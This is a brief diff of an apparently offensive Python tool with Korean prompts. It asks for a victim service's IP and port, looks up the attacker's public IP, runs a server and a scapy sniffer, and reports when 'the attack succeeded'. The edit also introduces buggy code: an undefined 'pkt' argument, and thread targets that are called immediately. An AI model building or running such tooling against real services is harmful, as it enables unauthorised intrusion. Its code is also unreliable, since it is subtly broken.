@@ -94,13 +94,13 @@ def success_check(pkt, ex_ip, victim_ip):
                 print('[+] 공격이 성공하였습니다.')
 
 def scapy_sniff(ex_ip, victim_ip):
-    sniff(prn=success_check(ex_ip=ex_ip,victim_ip=victim_ip))
+    sniff(prn=success_check(pkt=pkt, ex_ip=ex_ip,victim_ip=victim_ip))
 
 if __name__ == '__main__':
     ex_ip = get("https://api.ipify.org").text
     victim_ip = input('\n[+] 공격을 진행할 서비스의 IP 주소를 작성해주세요.\nEnter : ')
     victim_port = input('\n[+] 공격을 진행할 서비스의 PORT를 작성해주세요.\nEnter : ')
-    print('\n[+] 당신의 공격 목표가 ' + victim_ip + ':' + victim_port + '로 설정되었습니다.')
+    print('\n[+] 당신의 공격 목표가 ' + victim_ip + ':' + victim_port + '로 설정되었습니다.\n')
     t1 = threading.Thread(target=on_server(ex_ip))
     t2 = threading.Thread(target=scapy_sniff(ex_ip, victim_ip))
     t1.daemon = True
